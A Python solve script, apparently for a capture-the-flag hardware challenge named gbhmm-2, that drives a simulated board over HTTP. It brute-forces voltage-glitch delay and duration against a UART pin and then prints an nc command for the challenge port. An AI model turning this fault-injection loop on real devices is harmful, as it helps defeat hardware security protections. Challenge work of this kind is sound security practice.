import argparse
import statistics
from urllib.parse import urlparse

import requests


def setup(base_url):
    requests.post(
        base_url + "/wiring",
        json={
            "camera_rx": "uart_tx",
            "camera_tx": "uart_rx",
            "gnd": "gnd",
        },
    )
    requests.post(
        base_url + "/multimeter",
        json={
            "mode": "voltage",
            "red": "uart_tx",
            "black": "gnd",
        },
    )


def run(base_url, code):
    return requests.post(base_url + "/run_code", json={"code": code}).json()["output"]


def measure(base_url, delay, duration, samples=8):
    values = []

    for _ in range(samples):
        run(base_url, f"glitch(delay={delay}, duration={duration})")
        v = float(run(base_url, "get_pin_voltage('uart_tx')"))
        values.append(v)

    return values


def main():
    parser = argparse.ArgumentParser(description="VCC glitch exploit for gbhmm-2")
    parser.add_argument(
        "--url",
        default="http://localhost:5000",
        help="Base URL (default: http://localhost)",
    )
    args = parser.parse_args()

    print("[*] Setting up wiring and multimeter")
    setup(args.url)

    print("[*] Phase 1: find delay window")

    candidates = []

    for delay in range(0, 100):
        values = measure(args.url, delay, 5, samples=8)
        avg = statistics.mean(values)

        print(f"{delay} → {values} (avg={round(avg, 2)})")

        if avg > 0.2:
            candidates.append(delay)

    print("\n[*] candidates:", candidates)

    print("\n[*] Phase 2: brute duration (with retries)")

    for delay in candidates:
        for duration in range(1, 12):
            values = measure(args.url, delay, duration, samples=6)

            print(f"d={delay} dur={duration} => {values}")

            if any(v > 2.5 for v in values):
                print("\n[+] SUCCESS")
                print(f"delay={delay}, duration={duration}")
                host = urlparse(args.url).hostname or "localhost"
                print(f"Connect with: nc {host} 1337")
                return

    print("[-] failed")


if __name__ == "__main__":
    main()
